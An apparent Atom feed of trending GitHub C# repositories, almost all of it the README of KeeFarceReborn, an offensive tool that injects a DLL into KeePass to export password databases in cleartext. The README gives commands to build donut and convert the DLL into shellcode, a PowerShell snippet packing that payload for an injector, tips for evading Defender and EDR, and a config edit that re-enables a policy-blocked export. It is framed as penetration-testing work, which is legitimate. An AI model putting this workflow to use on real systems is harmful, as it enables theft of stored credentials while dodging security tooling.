<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-11-08T01:31:41Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>d3lb3/KeeFarceReborn</title>
    <updated>2022-11-08T01:31:41Z</updated>
    <id>tag:github.com,2022-11-08:/d3lb3/KeeFarceReborn</id>
    <link href="https://github.com/d3lb3/KeeFarceReborn" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A standalone DLL that exports databases in cleartext once injected in the KeePass process.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;KeeFarce Reborn&lt;/h1&gt; &#xA;&lt;p&gt;A standalone DLL that exports databases in cleartext once injected in the KeePass process.&lt;/p&gt; &#xA;&lt;p&gt;Heavily inspired by the great &lt;a href=&#34;https://github.com/denandz/KeeFarce&#34;&gt;KeeFarce&lt;/a&gt;, &lt;a href=&#34;https://github.com/GhostPack/KeeThief&#34;&gt;KeeThief&lt;/a&gt; and &lt;a href=&#34;https://github.com/HoLLy-HaCKeR/KeePassHax&#34;&gt;KeePassHax&lt;/a&gt; projects.&lt;/p&gt; &#xA;&lt;h2&gt;Yet another KeePass extraction tool, why ?&lt;/h2&gt; &#xA;&lt;p&gt;A few years ago, &lt;a href=&#34;https://github.com/denandz&#34;&gt;@denandz&lt;/a&gt; released &lt;a href=&#34;https://github.com/denandz/KeeFarce&#34;&gt;KeeFarce&lt;/a&gt;, the first offensive tool designed to extract KeePass databases in cleartex. It works by injecting a DLL into the running process, then walks the heap using &lt;a href=&#34;https://github.com/microsoft/clrmd&#34;&gt;ClrMD&lt;/a&gt; to find the necessary objects and invoke KeePass&#39;s builtin export method using reflection. Its only downside at the time was that multiple files needed to be dropped on the target (the extraction DLL + ClrMD DLL + the injector + a bootstrap DLL).&lt;/p&gt; &#xA;&lt;p&gt;A year later, &lt;a href=&#34;https://twitter.com/tifkin_&#34;&gt;@tifkin_&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt; released an in-depth review of offensive techniques targeting KeePass (while not available on harmj0y&#39;s blog anymore, the articles can be found on Wayback Machine: &lt;a href=&#34;https://web.archive.org/web/20220123003835/http://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/&#34;&gt;part 1&lt;/a&gt;, &lt;a href=&#34;https://web.archive.org/web/20220122225230/http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/&#34;&gt;part 2&lt;/a&gt;). It resulted in the release of &lt;a href=&#34;https://github.com/GhostPack/KeeThief&#34;&gt;KeeThief&lt;/a&gt;, a tool able to decrypt KeePass&#39; masterkey (including when alternative authentication method are used). It worked so well that KeePass developpers &lt;a href=&#34;https://sourceforge.net/p/keepass/discussion/329220/thread/62b0b650/&#34;&gt;added a parameter&lt;/a&gt; to mitigate this technique (it can be disabled by editing KeePass configuration file if the user have enough rights, which is pretty common).&lt;/p&gt; &#xA;&lt;p&gt;These tools quickly became my go-to during penetration testing, but they soon became obsolete as their injection techniques (namely, the famous Win32 APIs gang of &lt;em&gt;VirtualAllocEx&lt;/em&gt;, &lt;em&gt;WriteProcessMemory&lt;/em&gt;, &lt;em&gt;CreateRemoteThread&lt;/em&gt;, &lt;em&gt;WriteProcessMemory&lt;/em&gt;, etc) now immediately triggers detection. &lt;a href=&#34;https://twitter.com/snovvcrash&#34;&gt;@snovvcrash&lt;/a&gt; addressed this issue by forking KeeThief (now in a private repo, but still accessible &lt;a href=&#34;https://github.com/d3lb3/KeeThief&#34;&gt;here&lt;/a&gt;) to improve the injection mechanism with D/Invoke, writing a &lt;a href=&#34;https://hackmag.com/coding/keethief/&#34;&gt;great article&lt;/a&gt; detailing the process he followed. While it demonstrated the faisability of maintaining KeeThief, I find it difficult to regularly implement new injection techniques, as KeeThief&#39;s code is tightly linked to its injector.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/holly-hacker&#34;&gt;@holly-cracker&lt;/a&gt; also released &lt;a href=&#34;https://github.com/HoLLy-HaCKeR/KeePassHax&#34;&gt;KeePassHax&lt;/a&gt;, which comes as a single DLL and only uses reflection to decrypt KeePass&#39; masterkey. Inspired by this work, I decided to do the same with KeeFarce and write my own KeePass extraction tool with the following features:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Self-sufficient ⇒ no interaction needed with the injector&#39;s code to work.&lt;/li&gt; &#xA; &lt;li&gt;Only uses builtin .NET libraries (no ClrMD) ⇒ better compatibility + single-file DLL makes the injection process easier.&lt;/li&gt; &#xA; &lt;li&gt;Exports the database (like KeeFarce) ⇒ no need to retrieve the .kdbx nor using a custom KeePass build to input the recovered masterkey.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Building&lt;/h2&gt; &#xA;&lt;p&gt;As the code solely relies on .NET Framework with no external dependency, it should compile easily on Visual Studio 2015 and higher.&lt;/p&gt; &#xA;&lt;h2&gt;Usage Example&lt;/h2&gt; &#xA;&lt;p&gt;Once &lt;em&gt;KeePassReborn.dll&lt;/em&gt; is compiled, &lt;strong&gt;you must use your own injector&lt;/strong&gt; to target the running KeePass process. This is deliberate, as injectors become obsolete every few months.&lt;/p&gt; &#xA;&lt;p&gt;Because I personally find it easier to stealthily inject shellcode than DLL in a remote process, the first thing I typically start with is generating a position-independent shellcode from our DLL. It appears that &lt;a href=&#34;https://twitter.com/modexpblog?lang=fr&#34;&gt;@odzhan&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/thewover&#34;&gt;@TheWover&lt;/a&gt;&#39;s &lt;a href=&#34;https://github.com/TheWover/donut&#34;&gt;donut&lt;/a&gt; project perfectly suits our needs !&lt;/p&gt; &#xA;&lt;p&gt;We compile donut from a commit in the dev branch, as it fixes an &lt;a href=&#34;https://github.com/TheWover/donut/issues/44&#34;&gt;issue in application domain management&lt;/a&gt; that would prevent us from performing reflection in the default domain.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/TheWover/donut/&#xA;cd donut&#xA;git checkout 9d781d8da571eb1499122fc0e2d6e89e5a43603c&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We can easily build from Visual Studio&#39;s &lt;em&gt;x64 Native Tools Command Prompt&lt;/em&gt; with &lt;em&gt;nmake&lt;/em&gt; utility:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;nmake -f Makefile.msvc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Generating the shellcode is as simple as:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;.\donut.exe &#34;C:\KeeFarceReborn\KeePassReborn\bin\Release\KeeFarceReborn.dll&#34; -c KeeFarceReborn.Program -m Main -e 1&#xA;&#xA;  [ Donut shellcode generator v0.9.3&#xA;  [ Copyright (c) 2019 TheWover, Odzhan&#xA;&#xA;  [ Instance type : Embedded&#xA;  [ Module file   : &#34;C:\KeeFarceReborn\KeePassReborn\bin\Release\KeeFarceReborn.dll&#34;&#xA;  [ Entropy       : None&#xA;  [ File type     : .NET DLL&#xA;  [ Class         : KeeFarceReborn.Program&#xA;  [ Method        : Main&#xA;  [ Target CPU    : x86+amd64&#xA;  [ AMSI/WDLP     : continue&#xA;  [ Shellcode     : &#34;loader.bin&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note that &lt;code&gt;-e 1&lt;/code&gt; is necessary to disable entropy, otherwise the injected process won&#39;t be in the default application domain.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Let&#39;s compress it using PowerShell for easier integration in the injector&#39;s code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;$bytes = [System.IO.File]::ReadAllBytes(&#34;C:\donut\loader.bin&#34;)&#xA;[System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream&#xA;$deflateStream = New-Object System.IO.Compression.DeflateStream($outStream, [System.IO.Compression.CompressionLevel]::Optimal)&#xA;$deflateStream.Write($bytes, 0, $bytes.Length)&#xA;$deflateStream.Dispose()&#xA;$outBytes = $outStream.ToArray()&#xA;$outStream.Dispose()&#xA;$b64 = [System.Convert]::ToBase64String($outBytes)&#xA;Write-Output $b64 | clip&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You now have a payload ready to be injected with your favourite technique. If you don&#39;t know what to do now, I suggest you check &lt;a href=&#34;https://www.ired.team/offensive-security/code-injection-process-injection&#34;&gt;ired.team Code &amp;amp; Process Injection page&lt;/a&gt; to get familiar with the concept, then have a look into &lt;a href=&#34;https://jhalon.github.io/utilizing-syscalls-in-csharp-2/&#34;&gt;direct syscalls&lt;/a&gt; and &lt;a href=&#34;https://thewover.github.io/Dynamic-Invoke/&#34;&gt;D/Invoke&lt;/a&gt; which will probably do the job in most cases. &lt;a href=&#34;https://institute.sektor7.net/&#34;&gt;@SEKTOR7&lt;/a&gt;&#39;s malware development courses are full of great learnings if you can afford them.&lt;/p&gt; &#xA;&lt;p&gt;As an example, let&#39;s inject our payload using &lt;a href=&#34;https://twitter.com/snovvcrash&#34;&gt;snovvcrash&lt;/a&gt;&#39;s VeraCryptThief code (itself inspired by SEKTOR7 courses) which makes use of D/Invoke. To demonstrate, I copied his project in the &lt;a href=&#34;https://github.com/d3lb3/KeeFarceReborn/tree/main/SampleInjector&#34;&gt;SampleInjector&lt;/a&gt; folder, we only need to paste our compressed shellcode then compile in x64.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;While it still bypasses Defender at the moment (november 2022), tinkering your own injector will of course be needed in order to bypass modern EDRs. This sample injector is just here to demonstrate that everything behaves as expected.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;By running &lt;em&gt;.\SampleInjector.exe&lt;/em&gt; alongside an open KeePass database, you will see debug messages being printed in MessageBox (which should obviously be removed when used in a real penetration testing scenario) then find the exported database in the current user&#39;s &lt;em&gt;%APPDATA%&lt;/em&gt; (choosed by default, as KeePass will be sure to have write access). The exported XML file can later be imported in any KeePass database without asking for a password.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;If the export functionnality is disabled by policy, it can still be enabled by editing the KeePass.config.xml :&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;Policy&amp;gt;&#xA;    &amp;lt;Export&amp;gt;true&amp;lt;/Export&amp;gt;&#xA;&amp;lt;/Policy&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Possible Caveats&lt;/h2&gt; &#xA;&lt;h3&gt;Detection&lt;/h3&gt; &#xA;&lt;p&gt;While the main issue concerning KeePass extraction tools detection is injectors, in-memory scan may also trigger alerts when analyzing the shellcode. You will probably have to obfuscate and/or encrypt the shellcode to use with your injector.&lt;/p&gt; &#xA;&lt;p&gt;Also, the &lt;code&gt;Assembly.Load&lt;/code&gt; method used to perform reflection may be considered as a malicious behavior. I noticed that KeePass itself was sometimes using it for legitimate purposes so I guess most antiviral solutions won&#39;t flag it. If you have insights on this, feel free to let me know.&lt;/p&gt; &#xA;&lt;h3&gt;Compatibility&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;KeeFarce Reborn only relies on .NET Framework with no external dependency, so it should be fairly compatible with most targets.&lt;/li&gt; &#xA; &lt;li&gt;By default, KeeFarce Reborn&#39;s Visual Studio solution targets .NET 4.6 (installed by default on Windows 10) but can be retargeted edited.&lt;/li&gt; &#xA; &lt;li&gt;If .NET Framework is not installed on the target system, you can still set it up manually from command line using &lt;code&gt;DISM.exe&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;I only tested x64 payloads injection, but this should work as well with 32 bits architectures.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Roadmap&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Check in details what parts of the DLL can trigger EDRs&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Provide an obfuscated version of the DLL&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Add option to log events into a file to debug while attacking a target, without using noisy message boxes&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contribute&lt;/h2&gt; &#xA;&lt;p&gt;Pull requests are welcome. Feel free to open an issue or DM me on Twitter to suggest improvement.&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;p&gt;Bits of code where taken from the &lt;a href=&#34;https://github.com/denandz/KeeFarce&#34;&gt;KeeFarce&lt;/a&gt;, &lt;a href=&#34;https://github.com/GhostPack/KeeThief&#34;&gt;KeeThief&lt;/a&gt; and &lt;a href=&#34;https://github.com/HoLLy-HaCKeR/KeePassHax&#34;&gt;KeePassHax&lt;/a&gt; projects.&lt;/p&gt; &#xA;&lt;p&gt;The sample injection mechanism was directely taken from &lt;a href=&#34;https://twitter.com/snovvcrash&#34;&gt;snovvcrash&lt;/a&gt;&#39;s projects.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>winsecurity/Offensive-C-Sharp</title>
    <updated>2022-11-08T01:31:41Z</updated>
    <id>tag:github.com,2022-11-08:/winsecurity/Offensive-C-Sharp</id>
    <link href="https://github.com/winsecurity/Offensive-C-Sharp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Offensive-C-Sharp&lt;/h1&gt; &#xA;&lt;h2&gt;I wrote these while learning AD Pentesting and windows hacking&lt;/h2&gt;</summary>
  </entry>
</feed>